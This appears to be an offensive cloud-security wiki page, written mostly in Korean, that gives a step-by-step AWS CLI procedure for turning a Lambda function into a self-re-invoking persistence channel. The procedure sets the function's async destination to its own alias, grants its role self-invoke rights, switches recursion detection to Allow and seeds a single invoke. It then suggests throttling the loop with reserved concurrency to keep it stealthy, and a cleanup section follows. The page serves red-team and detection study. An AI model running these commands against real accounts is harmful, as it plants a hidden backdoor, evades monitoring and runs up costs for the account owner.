# AWS - Lambda Async Self-Loop Persistence via Destinations + Recursion Allow

Abuse Lambda asynchronous destinations together with the Recursion configuration to make a function continually re-invoke itself with no external scheduler (no EventBridge, cron, etc.). By default, Lambda terminates recursive loops, but setting the recursion config to Allow re-enables them. Destinations deliver on the service side for async invokes, so a single seed invoke creates a stealthy, code-free heartbeat/backdoor channel. Optionally throttle with reserved concurrency to keep noise low.

노트
- Lambda는 함수를 직접 자신의 destination으로 설정하는 것을 허용하지 않습니다. destination으로 함수 alias를 사용하고, execution role에 해당 alias를 invoke할 수 있도록 허용하세요.
- 최소 권한: 대상 함수의 event invoke config 및 recursion config를 읽고 업데이트할 수 있는 권한, 버전 publish 및 alias 관리 권한, 그리고 alias에 대해 lambda:InvokeFunction을 허용하도록 함수의 execution role 정책을 업데이트할 수 있는 권한.

## 요구사항
- Region: us-east-1
- 변수:
- REGION=us-east-1
- TARGET_FN=<target-lambda-name>

## 단계

1) 함수 ARN과 현재 recursion 설정 확인
```
FN_ARN=$(aws lambda get-function --function-name "$TARGET_FN" --region $REGION --query Configuration.FunctionArn --output text)
aws lambda get-function-recursion-config --function-name "$TARGET_FN" --region $REGION || true
```
2) 버전을 게시하고 alias를 생성/업데이트합니다 (self destination으로 사용됨)
```
VER=$(aws lambda publish-version --function-name "$TARGET_FN" --region $REGION --query Version --output text)
if ! aws lambda get-alias --function-name "$TARGET_FN" --name loop --region $REGION >/dev/null 2>&1; then
aws lambda create-alias --function-name "$TARGET_FN" --name loop --function-version "$VER" --region $REGION
else
aws lambda update-alias --function-name "$TARGET_FN" --name loop --function-version "$VER" --region $REGION
fi
ALIAS_ARN=$(aws lambda get-alias --function-name "$TARGET_FN" --name loop --region $REGION --query AliasArn --output text)
```
3) 함수 실행 역할이 별칭을 호출할 수 있도록 허용 (Lambda Destinations→Lambda에서 필요)
```
# Set this to the execution role name used by the target function
ROLE_NAME=<lambda-execution-role-name>
cat > /tmp/invoke-self-policy.json <<EOF
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "lambda:InvokeFunction",
"Resource": "${ALIAS_ARN}"
}
]
}
EOF
aws iam put-role-policy --role-name "$ROLE_NAME" --policy-name allow-invoke-self --policy-document file:///tmp/invoke-self-policy.json --region $REGION
```
4) async destination을 alias(self via alias)로 설정하고 retries를 비활성화
```
aws lambda put-function-event-invoke-config \
--function-name "$TARGET_FN" \
--destination-config OnSuccess={Destination=$ALIAS_ARN} \
--maximum-retry-attempts 0 \
--region $REGION

# Verify
aws lambda get-function-event-invoke-config --function-name "$TARGET_FN" --region $REGION --query DestinationConfig
```
5) 재귀 루프를 허용
```
aws lambda put-function-recursion-config --function-name "$TARGET_FN" --recursive-loop Allow --region $REGION
aws lambda get-function-recursion-config --function-name "$TARGET_FN" --region $REGION
```
6) 단일 비동기 invoke 시드
```
aws lambda invoke --function-name "$TARGET_FN" --invocation-type Event /tmp/seed.json --region $REGION >/dev/null
```
7) 지속적인 호출 관찰 (예시)
```
# Recent logs (if the function logs each run)
aws logs filter-log-events --log-group-name "/aws/lambda/$TARGET_FN" --limit 20 --region $REGION --query events[].timestamp --output text
# or check CloudWatch Metrics for Invocations increasing
```
8) 선택적 은밀 속도 제한
```
aws lambda put-function-concurrency --function-name "$TARGET_FN" --reserved-concurrent-executions 1 --region $REGION
```
## 정리
루프를 중단하고 persistence를 제거합니다.
```
aws lambda put-function-recursion-config --function-name "$TARGET_FN" --recursive-loop Terminate --region $REGION
aws lambda delete-function-event-invoke-config --function-name "$TARGET_FN" --region $REGION || true
aws lambda delete-function-concurrency --function-name "$TARGET_FN" --region $REGION || true
# Optional: delete alias and remove the inline policy when finished
aws lambda delete-alias --function-name "$TARGET_FN" --name loop --region $REGION || true
ROLE_NAME=<lambda-execution-role-name>
aws iam delete-role-policy --role-name "$ROLE_NAME" --policy-name allow-invoke-self --region $REGION || true
```
## 영향
- 단일 async invoke는 외부 스케줄러 없이 Lambda가 지속적으로 자체 re-invoke되게 하여 은밀한 persistence/heartbeat를 가능하게 합니다. Reserved concurrency는 노이즈를 단일 warm execution으로 제한할 수 있습니다.
